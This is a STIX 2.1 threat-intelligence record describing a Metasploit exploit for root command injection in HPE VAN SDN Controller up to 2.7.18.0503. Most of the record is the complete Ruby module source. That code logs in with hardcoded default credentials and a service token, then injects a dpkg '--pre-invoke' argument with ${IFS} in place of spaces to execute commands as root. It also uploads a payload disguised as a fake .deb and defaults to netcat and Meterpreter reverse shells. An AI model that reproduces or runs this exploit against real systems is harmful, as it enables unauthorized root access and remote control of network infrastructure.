{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9115768b-7aef-4ce6-89a0-4ebdc81b9619",
    "created": "2024-08-14T17:02:29.569153Z",
    "modified": "2024-08-14T17:02:29.569157Z",
    "name": "HP VAN SDN Controller Root Command Injection",
    "description": " This module exploits a hardcoded service token or default credentials in HPE VAN SDN Controller <= 2.7.18.0503 to execute a payload as root.  A root command injection was discovered in the uninstall action's name parameter, obviating the need to use sudo for privilege escalation.  If the service token option TOKEN is blank, USERNAME and PASSWORD will be used for authentication. An additional login request will be sent. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/hp_van_sdn_cmd_inject.rb",
            "external_id": "hp_van_sdn_cmd_inject.rb"
        },
        {
            "source_name": "reference",
            "url": "https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  # server: grizzly/2.2.16\n  HttpFingerprint = {pattern: [/^grizzly/]}\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'HP VAN SDN Controller Root Command Injection',\n      'Description'        => %q{\n        This module exploits a hardcoded service token or default credentials\n        in HPE VAN SDN Controller <= 2.7.18.0503 to execute a payload as root.\n\n        A root command injection was discovered in the uninstall action's name\n        parameter, obviating the need to use sudo for privilege escalation.\n\n        If the service token option TOKEN is blank, USERNAME and PASSWORD will\n        be used for authentication. An additional login request will be sent.\n      },\n      'Author'             => [\n        'Matt Bergin', # Vulnerability discovery and Python exploit\n        'wvu'          # Metasploit module and additional ~research~\n      ],\n      'References'         => [\n        ['EDB', '44951'],\n        ['URL', 'https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt']\n      ],\n      'DisclosureDate'     => '2018-06-25',\n      'License'            => MSF_LICENSE,\n      'Platform'           => ['unix', 'linux'],\n      'Arch'               => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Privileged'         => true,\n      'Targets'            => [\n        ['Unix In-Memory',\n          'Platform'       => 'unix',\n          'Arch'           => ARCH_CMD,\n          'Type'           => :unix_memory,\n          'Payload'        => {'BadChars' => ' '},\n          'DefaultOptions' => {'PAYLOAD'  => 'cmd/unix/reverse_netcat_gaping'}\n        ],\n        ['Linux Dropper',\n          'Platform'       => 'linux',\n          'Arch'           => [ARCH_X86, ARCH_X64],\n          'Type'           => :linux_dropper,\n          'DefaultOptions' => {'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'}\n        ]\n      ],\n      'DefaultTarget'      => 0,\n      'DefaultOptions'     => {'SSL' => true}\n    ))\n\n    register_options([\n      OptPort.new('RPORT',      [true,  'REST API port', 8081]),\n      OptPort.new('WEBUI_PORT', [true,  'Web UI port for creds login', 8443]),\n      OptString.new('TOKEN',    [false, 'Service token', 'AuroraSdnToken37']),\n      OptString.new('USERNAME', [false, 'Service username', 'sdn']),\n      OptString.new('PASSWORD', [false, 'Service password', 'skyline'])\n    ])\n\n    register_advanced_options([\n      OptString.new('PayloadName', [false, 'Payload name (random if unset)'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def default_credential?\n    true\n  end\n\n  def check\n    checkcode = CheckCode::Safe\n\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => '/',\n      'headers' => {'X-Auth-Token' => auth_token},\n      'ctype'   => 'application/json',\n      'data'    => {'action' => 'uninstall'}.to_json\n    )\n\n    if res.nil?\n      checkcode = CheckCode::Unknown\n    elsif res && res.code == 400 && res.body.include?('Missing field: name')\n      checkcode = CheckCode::Appears\n    elsif res && res.code == 401 && res.body =~ /Missing|Invalid token/\n      checkcode = CheckCode::Safe\n    end\n\n    checkcode\n  end\n\n  def exploit\n    if target['Type'] == :unix_memory\n      print_status('Executing command payload')\n      execute_command(payload.encoded)\n      return\n    end\n\n    print_status('Uploading payload as fake .deb')\n    payload_path = upload_payload\n    renamed_path = payload_path.gsub(/\\.deb$/, '')\n\n    register_file_for_cleanup(renamed_path)\n\n    print_status('Renaming payload and executing it')\n    execute_command(\n      \"mv #{payload_path} #{renamed_path} && \" \\\n      \"chmod +x #{renamed_path}\"\n    )\n    execute_command(renamed_path)\n  end\n\n  def upload_payload\n    payload_name = datastore['PayloadName'] ?\n                   \"#{datastore['PayloadName']}.deb\" :\n                   \"#{Rex::Text.rand_text_alphanumeric(8..42)}.deb\"\n    payload_path = \"/var/lib/sdn/uploads/#{payload_name}\"\n\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => '/upload',\n      'headers' => {'Filename' => payload_name, 'X-Auth-Token' => auth_token},\n      'ctype'   => 'application/octet-stream',\n      'data'    => generate_payload_exe\n    )\n\n    unless res && res.code == 200 && res.body.include?('{ }')\n      fail_with(Failure::UnexpectedReply, \"Failed to upload #{payload_path}\")\n    end\n\n    print_good(\"Uploaded #{payload_path}\")\n\n    payload_path\n  end\n\n  def execute_command(cmd)\n    # Argument injection in /opt/sdn/admin/uninstall-dpkg\n    injection = \"--pre-invoke=#{cmd}\"\n\n    # Ensure we don't undergo word splitting\n    injection = injection.gsub(/\\s+/, '${IFS}')\n\n    print_status(\"Injecting dpkg -r #{injection}\")\n\n    send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => '/',\n      'headers' => {'X-Auth-Token' => auth_token},\n      'ctype'   => 'application/json',\n      'data'    => {'action' => 'uninstall', 'name' => injection}.to_json\n    }, 0)\n  end\n\n  def auth_token\n    return @auth_token if @auth_token\n\n    token    = datastore['TOKEN']\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    if token && !token.empty?\n      print_status(\"Authenticating with service token #{token}\")\n      @auth_token = token\n      return @auth_token\n    end\n\n    print_status(\"Authenticating with creds #{username}:#{password}\")\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/sdn/ui/app/login',\n      'rport'     => datastore['WEBUI_PORT'],\n      'vars_post' => {'username' => username, 'password' => password}\n    )\n\n    unless res && res.get_cookies.include?('X-Auth-Token')\n      print_error('Invalid username and/or password specified')\n      return\n    end\n\n    @auth_token = res.get_cookies_parsed['X-Auth-Token'].first\n    print_good(\"Retrieved auth token #{@auth_token}\")\n\n    @auth_token\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-06-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}